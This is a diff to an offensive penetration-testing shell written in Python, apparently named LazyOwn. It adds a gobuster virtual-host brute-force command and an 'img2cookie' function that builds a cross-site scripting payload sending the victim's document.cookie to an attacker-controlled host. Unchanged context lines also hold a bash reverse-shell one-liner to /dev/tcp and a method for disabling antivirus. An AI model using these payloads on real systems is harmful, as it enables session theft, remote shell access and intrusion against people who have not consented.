@@ -1257,6 +1257,14 @@ class LazyOwnShell(Cmd):
             print_msg(f"Try gobuster dir --url {url}/ --wordlist {dirwordlist} {RESET}")
             os.system(f"gobuster dir --url {url}/ --wordlist {dirwordlist}")
             return
+        if line.startswith("vhost"):
+            url = self.params["url"]
+            if not url:
+                print_error(f"url must be set, ex: set url http://domain.ext {RESET}")
+                return
+            print_msg(f"Try gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600{RESET}")
+            os.system(f"gobuster vhost --append-domain -u {url} -w {dirwordlist} --random-agent -t 600")
+            return            
         print_msg(
             f"Try... gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} {RESET}"
         )
@@ -1770,6 +1778,27 @@ class LazyOwnShell(Cmd):
             f"echo \"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip"
         )
 
+        return
+
+    def do_img2cookie(self, line):
+        """Copy a malicious img tag to clipboard"""
+        lhost = self.params.get("lhost")
+        lport = self.params.get("lport")
+        rhost = self.params.get("rhost")
+        if not lhost or not lport or not rhost:
+            print_error(f"rhost, lhost and lport must be set.{RESET}")
+            return
+
+        print_msg(f"Crafting img payload...")
+
+        command = f"echo \"<script>new Image().src=\"http://{lhost}:80/cookie.php?c=\"+document.cookie;</script> \" | xclip -sel clip"
+
+        os.system(command)
+        print_warn("<modo_de_uso>")
+        print_msg(command)
+        print_warn("</modo_de_uso>")
+        print_msg(f"Payload copied to Clipboard")
+        
         return
 
     def do_disableav(self, line):
